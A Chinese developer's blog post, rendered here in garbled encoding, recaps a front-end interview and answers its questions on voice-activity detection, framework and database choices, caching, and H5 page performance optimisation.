thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>å°±è¯´æˆ‘è¿™æ¬¡çš„é¢è¯•ä½“éªŒæ¥è¯´ï¼Œèè‰æ¥å½¢å®¹æˆ‘è¿˜æ˜¯å¤ªå¼ºå£®äº†ï¼Œç®—äº†ä¸è¯´äº†ã€‚</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/034963b1e71e400ebbccb00e6ebf5ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSp5aSp5omt56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766042669&amp;x-signature=j5L3%2BPqWiRx2yKjbyAfpP%2FSf7KI%3D" alt="å°çŒ«å’ªæ‘‡é¥®æ–™.gif" width="30%" loading="lazy"/></p>
<p><strong>ä¸‹é¢æ˜¯é¢ç­‹ä¸€è§ˆï¼Œä¸‹é¢å¿…é¡»å°è¯•æ‰‹æ’•æ‰¾å›é¢œé¢</strong></p>
<ul>
<li>1.è‡ªæˆ‘ä»‹ç»</li>
<li>2.aiä½¿ç”¨ç‡</li>
<li>3.æ—¥å¸¸å¦‚ä½•ä½¿ç”¨ ai</li>
<li>4.é¡¹ç›®ä¸­æ‰“æ–­aiè¯­éŸ³è¾“å‡ºæ—¶å¦‚ä½•åŒºåˆ†äººå£°å’Œå™ªå£°</li>
<li>5.æ¶æ„é€‰å‹å¦‚ä½•å†³å®š</li>
<li>6.å®ä¹ ç»å†(ä¸»è¦åšä»€ä¹ˆã€é‡åˆ°çš„éš¾é¢˜æ˜¯ä»€ä¹ˆ)</li>
<li>7.å¦‚ä½•ä¼˜åŒ–h5é¡µé¢çš„æ€§èƒ½ â˜…â˜…â˜…</li>
<li>8.å¼ºç¼“å­˜å’Œåå•†ç¼“å­˜çš„åŒºåˆ« â˜…â˜…â˜…</li>
<li>9.å¦‚æœæœ‰å¤§é‡çš„ dom æ“ä½œå’Œ domåŠ¨ç”»ä¸€èµ·æ‰§è¡Œä¼šå‘ç”Ÿä»€ä¹ˆ-faberæ¶æ„ â˜…â˜…â˜…</li>
<li>10.http1.0å’Œhttp2.0çš„åŒºåˆ« â˜…â˜…â˜…</li>
<li>11.https TLSåŠ å¯†çš„è¿‡ç¨‹ â˜…â˜…â˜…</li>
</ul>
<h2 data-id="heading-1">ä¸€ã€è‡ªæˆ‘ä»‹ç»ï¼ˆå¯è·³è¿‡ï¼‰</h2>
<p>è¿™é‡Œå°±ä¸æš´éœ²ä¸ªäººä¿¡æ¯äº†ï¼Œæ ¸å¿ƒæ˜¯å›´ç»•è‡ªå·±çš„äº®ç‚¹å’Œä¼˜åŠ¿æ¥ä»‹ç»</p>
<h2 data-id="heading-2">äºŒã€aiä½¿ç”¨ç‡ï¼ˆå¯è·³è¿‡ï¼‰</h2>
<p>é¢è¯•å®˜çš„å¿ƒæ€è°èƒ½ç¢ç£¨é€å‘¢ï¼Ÿæƒ³è®©æˆ‘ä»¬å¤šç”¨AIå—ï¼Ÿè¿˜æ˜¯ç›¸åçš„ï¼Ÿ</p>
<p>æ—¢ç„¶å‰é¢éƒ½è¯´äº†ç”¨äº†é‚£ä¹ˆå¤šAIæŠ€æœ¯äº†ï¼Œé‚£è‚¯å®šæ˜¯80%ä»¥ä¸Šå•Šï¼ˆäº‹å®ä¹Ÿç¡®å®å¦‚æ­¤ï¼Œç”šè‡³æ›´é«˜ï¼‰</p>
<h2 data-id="heading-3">ä¸‰ã€å¦‚ä½•ä½¿ç”¨ aiï¼ˆå¯è·³è¿‡ï¼‰</h2>
<p>AIæ˜¯ä¸‡èƒ½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¸èƒ½ä¸€ç‚¹äº‹ä¸å¹²ï¼Œä¸ç„¶ä¼šç»™é¢è¯•å®˜ç•™ä¸‹åªä¼šAIçš„æ€æƒ³ä¾å„’ã€‚</p>
<p>ç°åœ¨éšç€AI Codingçš„å…´èµ·ï¼Œæ›´å¯è´µçš„æ˜¯äº§å“æ€ç»´ï¼ŒAIçš„å·¥ä½œåº”è¯¥æ˜¯ä¸€ç§ææ•ˆçš„å·¥å…·è€Œä¸æ˜¯ä¸€ç§å¹³æ›¿ã€‚AI Codingæ—¶ä»£ä¸‹éœ€è¦çš„æ˜¯ä¸€ä¸ªæœ‰å¤§å±€è§‚çš„çŸ¥è¯†é¢å¹¿çš„æŒ‡æŒ¥è€…ï¼Œï¼Œæ‰€ä»¥è¦æ‰“å‡ºä½ å’ŒAIçš„ç»„åˆæŠ€ã€‚ä¸‹é¢æ˜¯ä¸€ç§å¾ˆå¥½çš„å›ç­”ï¼Œæ—¥å¸¸å·¥ä½œä¹Ÿå»ºè®®è¿™æ ·åšã€‚</p>
<p>æˆ‘æœ‰ä¸€ä¸ªå¾ˆå¥½çš„ideaï¼Œæˆ‘è®¤ä¸ºè¿™ä¸ªideaå¾ˆæœ‰å‰æ™¯ï¼Œæœ‰å•†ä¸šä»·å€¼ï¼ŒAIå¯ä»¥å¸®æˆ‘è°ƒç ”å®Œå–„è¿™ä¸ªèŒèŠ½çŠ¶æ€ä¸‹çš„ideaï¼ŒæŠ€æœ¯çš„é€‰å‹å’Œé¡¹ç›®çš„åŸºç¡€æ¶æ„ä¹Ÿæ˜¯æˆ‘æ¥å®Œæˆçš„ï¼ŒAIè´Ÿè´£å®Œæˆå…·ä½“çš„åŠŸèƒ½æ¨¡å—çš„ä»£ç å®ç°ï¼Œå› ä¸ºAIå¯¹å°çš„ç»†èŠ‚æ–¹é¢çš„æŠŠæ§æ˜¯å¾ˆä¼˜ç§€çš„ï¼Œä¹‹åä½¿ç”¨AIåšä»£ç çš„reviewã€‚</p>
<h2 data-id="heading-4">å››ã€é¡¹ç›®ä¸­å¦‚ä½•å®ç°çš„AIå¯¹è¯è¯­éŸ³æ‰“æ–­æœºåˆ¶ï¼ˆå¯è·³è¿‡ï¼‰</h2>
<p>é¡¹ç›®ä½¿ç”¨çš„æ˜¯VADæ‰“æ–­æœºåˆ¶ï¼Œç›®çš„æ˜¯æŠŠä¸€ä¸ªæ­»æ¿çš„ WebSocket ç®¡é“ï¼Œå˜æˆä¸€ä¸ªçµæ´»çš„ã€å¯äº¤äº’çš„â€œäººâ€ã€‚</p>
<p>ç”¨çš„ <strong>VAD ç®—æ³•</strong>å…¶å®éå¸¸ç»å…¸ä¸”åŸºç¡€ï¼Œå«Â åŸºäºèƒ½é‡çš„æ£€æµ‹ã€‚</p>
<blockquote>
</blockquote>
<ul>
<li>RMS (Root Mean Squareï¼Œå‡æ–¹æ ¹)ï¼šç”¨æ¥è¡¡é‡ä¸€æ®µå£°éŸ³çš„â€œå“åº¦â€ã€‚</li>
</ul>

<ul>
<li>æƒ³è±¡ä¸€ä¸ªæ³¢å½¢å›¾ï¼Œä¸Šä¸‹è·³åŠ¨ã€‚å¦‚æœæ³¢å½¢å¹³å¹³çš„ï¼ˆæ¯”å¦‚ 0.001ï¼‰ï¼Œè¯´æ˜æ²¡å£°éŸ³ï¼›å¦‚æœæ³¢å½¢å‰§çƒˆè·³åŠ¨ï¼ˆæ¯”å¦‚Â 0.5ï¼‰ï¼Œè¯´æ˜æœ‰å£°éŸ³ã€‚</li>
</ul>

<ul>
<li>ç®—æ³•å°±æ˜¯ï¼šæŠŠè¿™ä¸€å¸§é‡Œæ‰€æœ‰çš„é‡‡æ ·ç‚¹ï¼ˆæ¯”å¦‚ 4096 ä¸ªç‚¹ï¼‰å¹³æ–¹ -&gt; åŠ èµ·æ¥ -&gt; é™¤ä»¥æ€»æ•° -&gt; å¼€æ ¹å·ã€‚è¿™å°±æ˜¯è¿™æ®µéŸ³é¢‘çš„â€œå¹³å‡èƒ½é‡â€ã€‚</li>
</ul>
<p><strong>é€»è¾‘æµç¨‹ï¼š</strong></p>
<ol>
<li>ç®—å“åº¦ï¼šæ¯æ¥ä¸€å¸§éŸ³é¢‘ï¼ˆçº¦ 0.1 ç§’ï¼‰ï¼Œå°±ç®—ä¸€æ¬¡ RMSã€‚</li>
</ol>

<ol start="2">
<li>æ¯”é˜ˆå€¼ï¼šè®¾ä¸€ä¸ªçº¢çº¿ï¼ˆSILENCE_THRESHOLD = 0.02ï¼‰ã€‚</li>
</ol>
<ul>
<li>RMS &lt; 0.02ï¼šè®¤ä¸ºæ˜¯é™éŸ³/å™ªéŸ³ã€‚</li>
</ul>

<ul>
<li>RMS &gt; 0.02ï¼šè®¤ä¸ºæ˜¯äººå£°ã€‚</li>
</ul>
<ol start="3">
<li>é˜²æŠ–åŠ¨ï¼š</li>
</ol>
<ul>
<li>é—®é¢˜ï¼šå¦‚æœæˆ‘å°±æ‹äº†ä¸€ä¸‹æ¡Œå­ï¼ˆå•ªï¼ï¼‰ï¼ŒRMS ç¬é—´é£™é«˜ï¼Œä½†è¿™ä¸ç®—è¯´è¯ï¼Œä¸èƒ½æ‰“æ–­ AIã€‚</li>
</ul>

<ul>
<li>è§£å†³ï¼šä¹Ÿå°±æ˜¯ä½ ä»£ç é‡Œçš„Â SPEECH_FRAMES_THRESHOLD = 5ã€‚å¿…é¡»è¿ç»­ 5 å¸§ï¼ˆçº¦ 0.5 ç§’ï¼‰éƒ½è¶…è¿‡çº¢çº¿ï¼Œç³»ç»Ÿæ‰è®¤å®šâ€œè¿™äººçœŸåœ¨è¯´è¯â€ï¼Œç„¶åè§¦å‘æ‰“æ–­ã€‚</li>
</ul>
<blockquote>
</blockquote>
<p>ä½†æ˜¯RMS çš„ VADÂ æœ€å¤§çš„çŸ­æ¿å°±æ˜¯æ— æ³•åŒºåˆ†â€˜äººå£°â€™å’Œâ€˜èƒŒæ™¯å™ªéŸ³â€™ã€‚</p>
<p>åœ¨ç›®å‰çš„ Demo ç¯å¢ƒï¼ˆå®‰é™å®¤å†…ï¼‰ï¼Œè¿™ä¸ªæ–¹æ¡ˆæ•ˆæœå¾ˆå¥½ä¸”æåº¦è½»é‡ï¼ˆè®¡ç®—é‡å‡ ä¹ä¸º 0ï¼‰ã€‚å¦‚æœè¦åœ¨ç”Ÿäº§ç¯å¢ƒï¼ˆå¦‚å’–å•¡å…ï¼‰è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘æœ‰ä¸¤å¥—æˆç†Ÿçš„å‡çº§æ–¹æ¡ˆï¼š</p>
<p>1.Â å‰ç«¯æ–¹æ¡ˆï¼š<strong>å¼•å…¥Â WebRTC VADÂ æˆ–Â rnnoiseï¼ˆåŸºäº RNN çš„é™å™ªåº“ï¼‰</strong>ï¼Œå®ƒä»¬èƒ½æå–éŸ³é¢‘ç‰¹å¾ï¼Œ<strong>è¯†åˆ«æ˜¯å¦æ˜¯â€˜äººå£°é¢‘è°±â€™</strong>ï¼Œè€Œä¸ä»…ä»…çœ‹å“åº¦ã€‚</p>
<p>2.Â åç«¯æ–¹æ¡ˆï¼ˆæ›´æ¨èï¼‰ï¼šé˜¿é‡Œäº‘ Qwen-Omni åè®®<strong>æœ¬èº«æ”¯æŒÂ server_vad</strong>ã€‚æˆ‘å¯ä»¥æŠŠåˆ¤æ–­é€»è¾‘äº¤ç»™äº‘ç«¯æ¨¡å‹ï¼Œå› ä¸ºå¤§æ¨¡å‹å¯¹è¯­éŸ³çš„ç†è§£èƒ½åŠ›è¿œå¼ºäºæœ¬åœ°ç®—æ³•ã€‚æˆ‘åªéœ€<strong>æŠŠæ‰€æœ‰éŸ³é¢‘æµä¸Šå»</strong>ï¼Œå¦‚æœæœåŠ¡ç«¯ä¸‹å‘Â input_audio_buffer.speech_startedÂ äº‹ä»¶ï¼Œæˆ‘<strong>å†æ‰§è¡Œæ‰“æ–­</strong>ã€‚è¿™èƒ½æå¤§é™ä½è¯¯è§¦ç‡ã€‚</p>
<h2 data-id="heading-5">äº”ã€æ¶æ„é€‰å‹å¦‚ä½•å†³å®šï¼ˆæ ¹æ®ä¸ªäººçš„æŠ€æœ¯æ ˆæ¥é€‰æ‹©çš„ï¼‰</h2>
<p>å› ä¸ºæˆ‘çš„æ–¹å‘æ˜¯å¤§å‰ç«¯ä¸‹çš„å…¨æ ˆå¼€å‘ï¼Œæ‰€ä»¥é€‰å‹æˆ‘ä¼šä»ä¸‹é¢çš„æ–¹å‘è€ƒè™‘â€”â€”</p>
<h4 data-id="heading-6">1.æ˜¯å¦éœ€è¦SEOï¼ˆReactå’ŒNext.jsï¼‰</h4>
<p>React ä¸ Next.js çš„é€‰æ‹©æ ¸å¿ƒçœ‹é¡¹ç›®éœ€æ±‚ï¼š</p>
<p>æ—  SEO éœ€æ±‚ã€ä¾§é‡çº¯å®¢æˆ·ç«¯äº¤äº’çš„åœºæ™¯ï¼ˆå¦‚æµè§ˆå™¨æ’ä»¶ã€å†…éƒ¨ AI å·¥å…·ï¼‰ï¼Œé€‰<strong>React</strong>ï¼Œæ­é… Vite æ‰“åŒ…ä½“ç§¯å°ï¼Œèšç„¦å‰ç«¯æµç•…ä½“éªŒï¼›</p>
<p>éœ€ SEOã€é¦–å±ä¼˜åŒ–æˆ–å¿«é€Ÿæ­å»º AI æ¥å£ä¸­é—´å±‚çš„åœºæ™¯ï¼ˆå¦‚ AI å†…å®¹å¹³å°ã€å¯¹å¤–å·¥å…·ï¼‰ï¼Œé€‰<strong>Next.js</strong>ï¼Œå…¶ SSR/SSG èƒ½åŠ›å’Œ API Routes èƒ½é™ä½å…¨æ ˆå¼€å‘æˆæœ¬ã€‚äºŒè€…å¹¶éæ›¿ä»£å…³ç³»ï¼ŒNext.js æ˜¯åŸºäº React çš„å¢å¼ºæ¡†æ¶ã€‚</p>
<h4 data-id="heading-7">2.ç§»åŠ¨ç«¯åº”ç”¨è¿˜æ˜¯PCç«¯åº”ç”¨ï¼ˆUIæ¶æ„é€‰æ‹©ï¼‰</h4>
<ul>
<li><strong>PC ç«¯ï¼ˆå¦‚ AI ç®¡ç†åå°ã€ä»£ç åŠ©æ‰‹ï¼‰</strong> ï¼šä¼˜å…ˆé€‰ Ant Design Pro/Element Plusï¼Œè¿™ç±»ç»„ä»¶åº“é€‚é…å¤§å±ï¼Œè‡ªå¸¦å¤æ‚è¡¨æ ¼ã€æƒé™èœå•ã€å¤šçª—å£å¸ƒå±€ï¼Œå¥‘åˆ AI å¹³å°å‚æ•°é…ç½®ã€æ•°æ®å¯è§†åŒ–éœ€æ±‚ï¼›ToC åˆ›æ–°å·¥å…·å¯é€‰ Tailwind+Radix UIï¼Œçµæ´»å®šåˆ¶ä¸ªæ€§åŒ–äº¤äº’ã€‚</li>
<li><strong>ç§»åŠ¨ç«¯ï¼ˆå¦‚ AI å¯¹è¯ APPã€ç§»åŠ¨ç«¯ç”Ÿæˆå·¥å…·ï¼‰</strong> ï¼šé€‰ Vant/PrimeVue Mobileï¼Œç»„ä»¶é€‚é…è§¦å±æ“ä½œï¼Œæ”¯æŒå“åº”å¼å¸ƒå±€ï¼›è·¨ç«¯åœºæ™¯ç”¨ Ionic æˆ– React Native Webï¼Œä¸€å¥—ä»£ç è¦†ç›–ç§»åŠ¨ç«¯ä¸ Webï¼›è½»é‡åŒ– H5 é€‰ UnoCSSï¼Œå‡å°‘åŠ è½½ä½“ç§¯ã€‚</li>
</ul>
<h4 data-id="heading-8">3.åç«¯æ¡†æ¶é€‰æ‹©</h4>
<p>ä½œä¸ºåå‰ç«¯çš„å…¨æ ˆå¼€å‘è€…ï¼Œæˆ‘ä¼šä¼˜å…ˆé€‰æ‹©Â  <strong>â€œNext.js API Routes + äº‘æœåŠ¡ + è½»é‡çº§åç«¯â€</strong> Â çš„ç»„åˆï¼Œå‡å°‘åç«¯ç»´æŠ¤æˆæœ¬ã€‚</p>
<p>å¯¹äºä¸­å¤§å‹çš„é¡¹ç›®ï¼Œæˆ‘ä¼šä½¿ç”¨ä½¿ç”¨æ›´è½»é‡çš„Egg.jsæ˜¯ç”±é˜¿é‡Œå·´å·´å¼€æºçš„åŸºäºkoaï¼Œå°å‹é¡¹ç›®ä¼šé€‰æ‹©Express</p>
<p>ä¸­å¤§å‹é¡¹ç›®é€‰ Egg.jsï¼ˆé˜¿é‡Œå¼€æºã€åŸºäº Koaï¼‰ï¼Œå› å…¶å†…ç½®çº¦å®šå¼ç›®å½•è§„èŒƒã€åˆ†å±‚æ¶æ„å’Œä¼ä¸šçº§æ’ä»¶ä½“ç³»ï¼ˆå¦‚å¤šç¯å¢ƒé…ç½®ã€æ—¥å¿—ï¼‰ï¼Œèƒ½è§„é¿ä»£ç æ··ä¹±ï¼Œé€‚é…å¤æ‚é€»è¾‘ï¼ˆå¦‚ AI æ¥å£åˆ†å±‚ã€å¤šæ¨¡å‹è°ƒç”¨ï¼‰ï¼Œé•¿æœŸç»´æŠ¤æˆæœ¬ä½ï¼›</p>
<p>å°å‹é¡¹ç›®é€‰Expressï¼Œå®ƒæç®€æ— çº¦æŸï¼Œå‡ è¡Œä»£ç å°±èƒ½æ­å»ºæ¥å£ï¼Œæ— éœ€éµå¾ªå›ºå®šè§„èŒƒï¼Œå¿«é€Ÿè½åœ°è½»é‡éœ€æ±‚ï¼ˆå¦‚å•æ¥å£ AI å·¥å…·ï¼‰ï¼Œé¿å… Egg.js çš„é…ç½®å†—ä½™ï¼Œæå‡è¿­ä»£æ•ˆç‡ã€‚</p>
<h4 data-id="heading-9">4.æ•°æ®åº“é€‰æ‹©ï¼ˆMysqlã€MongoDBã€supabaseï¼‰</h4>
<p>ç»“æ„åŒ–æ•°æ® + å¼ºäº‹åŠ¡éœ€æ±‚ï¼ˆå¦‚ AI å¹³å°çš„ç”¨æˆ·è®¡è´¹ã€æƒé™ï¼‰ï¼Œä¸­å¤§å‹é¡¹ç›®é€‰ MySQLï¼Œä¾æ‰˜å…¶ ACID ç‰¹æ€§å’Œå…³è”æŸ¥è¯¢ä¼˜åŠ¿ï¼›éç»“æ„åŒ– / åŠç»“æ„åŒ–æ•°æ®ï¼ˆå¦‚ AI å¯¹è¯å†å²ã€æ¨¡å‹å‚æ•°ï¼‰ï¼Œé€‰ MongoDBï¼Œæ—  Schema çº¦æŸé€‚é…çµæ´»æ‰©å±•ã€‚</p>
<p>å°å‹é¡¹ç›®ä¼˜å…ˆ Supabaseï¼Œä½œä¸º PostgreSQL-based çš„ BaaS å¹³å°ï¼Œé›¶ä»£ç å®ç°è®¤è¯ã€å®æ—¶åŒæ­¥ï¼Œå¿«é€Ÿè½åœ°æ ¸å¿ƒåŠŸèƒ½ï¼›è‹¥ä»…éœ€è½»é‡å­˜å‚¨éç»“æ„åŒ–æ•°æ®ï¼Œä¹Ÿå¯é€‰ MongoDBã€‚</p>
<h2 data-id="heading-10">å…­ã€å®ä¹ ç»å†(ä¸»è¦åšä»€ä¹ˆã€é‡åˆ°çš„éš¾é¢˜æ˜¯ä»€ä¹ˆ)</h2>
<p><strong>å®ä¹ ç»å†è¦çªå‡ºè‡ªå·±çš„å·¥ä½œç‰¹ç‚¹å¹¶ä½¿ç”¨å·¥ä½œç»å†æ¥ä½è¯ï¼Œè€Œä¸”è¦ç»†è®²ä¸€ä¸ªåœ¨å·¥ä½œä¸­ä¸»è¦è´Ÿè´£çš„é¡¹ç›®ï¼Œå…¶å®ƒçš„å‡ å¥è¯å¸¦è¿‡</strong></p>
<h2 data-id="heading-11">ä¸ƒã€å¦‚ä½•ä¼˜åŒ–h5é¡µé¢çš„æ€§èƒ½ â˜…â˜…â˜…</h2>
<p>è¿™ä¸ªé—®é¢˜æ˜¯æ•´ä¸ªé¢è¯•è¿‡ç¨‹ä¸­æœ€æ ¸å¿ƒçš„é—®é¢˜ï¼Œæ¶‰åŠåˆ°äº†å‰ç«¯å¼€å‘çš„å„ä¸ªæ–¹é¢ï¼Œéœ€è¦æ…é‡å›ç­”ï¼Œæˆ‘çš„ç­”æ¡ˆä¹Ÿè‚¯å®šä¸å®Œå…¨ï¼Œæ¬¢è¿è¯„è®ºåŒºè¡¥å……</p>
<p>æˆ‘ä»¬å¯ä»¥ä»ä¸ƒä¸ªç»´åº¦å±•å¼€æ¥è®²â€”â€”<strong>åŠ è½½é˜¶æ®µä¼˜åŒ–</strong>ã€<strong>æ¸²æŸ“é˜¶æ®µä¼˜åŒ–</strong>ã€<strong>è¿è¡Œé˜¶æ®µä¼˜åŒ–</strong>ã€<strong>ç½‘ç»œäº¤äº’ä¼˜åŒ–</strong>ã€<strong>é€‚é…ä¸å…¼å®¹ä¼˜åŒ–</strong>ã€<strong>æ€§èƒ½ç›‘æ§ä¸æŒç»­è¿­ä»£</strong>ã€<strong>reactä¼˜åŒ–</strong></p>
<h4 data-id="heading-12"><strong>ï¼ˆ1ï¼‰åŠ è½½é˜¶æ®µä¼˜åŒ–ï¼šèµ„æºæœ€å°åŒ–ä¸ä¼ è¾“æ™ºèƒ½åŒ–</strong></h4>
<h5 data-id="heading-13"><strong>1. èµ„æºå‹ç¼©ä¸ä¼˜åŒ–</strong></h5>
<ul>
<li>
<p><strong>ä»£ç çº§å‹ç¼©</strong>ï¼š</p>
<ul>
<li><strong>JS/CSSå‹ç¼©</strong>ï¼šä½¿ç”¨Â <code>Terser</code>ã€<code>CSSNano</code>Â è¿›è¡Œæ··æ·†ã€åˆ é™¤æ­»ä»£ç ã€‚â˜…â˜…â˜…</li>
<li><strong>Tree Shaking</strong>ï¼šé€šè¿‡ES6æ¨¡å—é™æ€åˆ†æï¼Œå‰”é™¤æœªä½¿ç”¨çš„å¯¼å‡ºä»£ç ï¼ˆå¦‚ä»…å¯¼å…¥UIåº“çš„ç‰¹å®šç»„ä»¶ï¼‰ã€‚</li>
<li><strong>ç°ä»£å›¾ç‰‡æ ¼å¼</strong>ï¼š<strong>ä¼˜å…ˆä½¿ç”¨WebP/AVIF</strong>ï¼Œç›¸æ¯”PNG/JPEGå¯å‡å°‘30%-70%ä½“ç§¯ã€‚ä¸ºå…¼å®¹æ€§æä¾›Â <code>&lt;picture&gt;</code>Â æ ‡ç­¾é™çº§ã€‚â˜…â˜…â˜…</li>
<li><strong>å›¾ç‰‡å°ºå¯¸é€‚é…</strong>ï¼šé€šè¿‡Â <code>srcset</code>Â å’ŒÂ <code>sizes</code>Â å±æ€§ï¼Œæ ¹æ®è®¾å¤‡DPRå’Œè§†å£å®½åº¦åŠ è½½æœ€åˆé€‚çš„å›¾ç‰‡ã€‚â˜…â˜…â˜…</li>
<li><strong>å­—ä½“å­é›†åŒ–</strong>ï¼šä½¿ç”¨Â <code>fonttools</code>Â ç­‰å·¥å…·æå–é¡µé¢å®é™…ä½¿ç”¨çš„å­—ç¬¦ï¼ˆå°¤å…¶å¯¹äºä¸­æ–‡å­—ä½“ï¼‰ï¼Œç”Ÿæˆç²¾ç®€çš„WOFF2æ–‡ä»¶ã€‚</li>
</ul>
</li>
</ul>
<h5 data-id="heading-14"><strong>2. æ™ºèƒ½åŠ è½½ç­–ç•¥</strong></h5>
<ul>
<li>
<p><strong>å…³é”®æ¸²æŸ“è·¯å¾„ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li><strong>å†…è”å…³é”®CSS</strong>ï¼šå°†é¦–å±æ¸²æŸ“ï¼ˆAbove The Foldï¼‰æ‰€å¿…éœ€çš„CSSç›´æ¥å†…åµŒåœ¨HTMLÂ <code>&lt;style&gt;</code>Â æ ‡ç­¾ä¸­ï¼Œæ¶ˆé™¤è¯·æ±‚é˜»å¡ã€‚â˜…â˜…â˜…</li>
<li><strong>å¼‚æ­¥/å»¶è¿Ÿéå…³é”®JS</strong>ï¼šä½¿ç”¨Â <code>async</code>ï¼ˆç‹¬ç«‹æ¨¡å—ï¼‰æˆ–Â <code>defer</code>ï¼ˆä¿æŒé¡ºåºï¼‰å±æ€§åŠ è½½éé˜»å¡è„šæœ¬ã€‚â˜…â˜…â˜…</li>
</ul>
</li>
<li>
<p><strong>èµ„æºæç¤º</strong>ï¼š</p>
<ul>
<li><code>preload</code>ï¼šå¼ºåˆ¶é«˜ä¼˜å…ˆçº§åŠ è½½<strong>å½“å‰é¡µé¢</strong>çš„æ ¸å¿ƒèµ„æºï¼ˆå¦‚å…³é”®å­—ä½“ã€é¦–å±è‹±é›„å›¾ï¼‰ã€‚</li>
<li><code>preconnect</code>Â /Â <code>dns-prefetch</code>ï¼šæå‰ä¸ç¬¬ä¸‰æ–¹åŸŸåå»ºç«‹TCPè¿æ¥æˆ–è¿›è¡ŒDNSè§£æã€‚</li>
<li><code>prefetch</code>ï¼š<strong>ä½ä¼˜å…ˆçº§</strong>é¢„è·å–ä¸‹ä¸€ä¸ªå¯¼èˆªå¯èƒ½éœ€è¦çš„èµ„æºã€‚</li>
</ul>
</li>
<li>
<p><strong>æŒ‰éœ€åŠ è½½/æ‡’åŠ è½½</strong>ï¼š</p>
<ul>
<li><strong>è·¯ç”±æ‡’åŠ è½½</strong>ï¼šä½¿ç”¨Â <code>import()</code>Â åŠ¨æ€å¯¼å…¥è·¯ç”±ç»„ä»¶ã€‚â˜…â˜…â˜…</li>
<li><strong>ç»„ä»¶æ‡’åŠ è½½</strong>ï¼šéé¦–å±äº¤äº’ç»„ä»¶ï¼ˆå¦‚AIå·¥å…·çš„å¤æ‚å‚æ•°é¢æ¿ï¼‰åœ¨éœ€è¦æ—¶åŠ è½½ã€‚â˜…â˜…â˜…</li>
<li><strong>å›¾ç‰‡/iframeæ‡’åŠ è½½</strong>ï¼šä½¿ç”¨åŸç”ŸÂ <code>loading="lazy"</code>Â æˆ–Â <code>IntersectionObserver</code>Â APIå®ç°ã€‚â˜…â˜…â˜…</li>
</ul>
</li>
</ul>
<h5 data-id="heading-15"><strong>3. ç¼“å­˜ç­–ç•¥â˜…â˜…â˜…</strong></h5>
<ul>
<li><strong>å¼ºç¼“å­˜</strong>ï¼šä¸ºå¸¦HashæŒ‡çº¹çš„é™æ€èµ„æºè®¾ç½®Â <code>Cache-Control: max-age=31536000</code>ï¼ˆä¸€å¹´ï¼‰ã€‚â˜…â˜…â˜…</li>
<li><strong>åå•†ç¼“å­˜</strong>ï¼šå¯¹å¯èƒ½å˜åŒ–çš„èµ„æºä½¿ç”¨Â <code>ETag</code>/<code>Last-Modified</code>ã€‚â˜…â˜…â˜…</li>
<li><strong>Service Workerç¼“å­˜</strong>ï¼šå®ç°æ›´ç²¾ç»†çš„ç¦»çº¿ç¼“å­˜ã€ç½‘ç»œé™çº§å’Œèµ„æºé¢„ç¼“å­˜ç­–ç•¥ã€‚</li>
<li><strong>æœ¬åœ°å­˜å‚¨</strong>ï¼šå°†ä¸æ•æ„Ÿçš„AIæ¨¡å‹é…ç½®ã€ç”¨æˆ·åå¥½å­˜å…¥Â <code>localStorage</code>ï¼Œå‡å°‘æ¥å£è¯·æ±‚ã€‚â˜…â˜…â˜…</li>
</ul>
<h5 data-id="heading-16"><strong>4. æ„å»ºä¸ä¼ è¾“ä¼˜åŒ–</strong></h5>
<ul>
<li><strong>ä»£ç åˆ†å‰²</strong>ï¼šåŸºäºè·¯ç”±ã€ç»„ä»¶æˆ–åŠ¨æ€å¯¼å…¥ï¼Œå°†ä»£ç æ‹†åˆ†æˆå¤šä¸ªæŒ‰éœ€åŠ è½½çš„Chunkã€‚</li>
<li><strong>å¯ç”¨HTTP/2/HTTP3</strong>ï¼šåˆ©ç”¨å¤šè·¯å¤ç”¨ã€å¤´éƒ¨å‹ç¼©ç­‰ç‰¹æ€§æå‡ä¼ è¾“æ•ˆç‡ã€‚â˜…â˜…â˜…</li>
<li><strong>å¼€å¯Brotli/Gzipå‹ç¼©</strong>ï¼šåœ¨æœåŠ¡å™¨ç«¯å¯¹æ–‡æœ¬èµ„æºè¿›è¡Œé«˜æ•ˆå‹ç¼©ã€‚</li>
</ul>
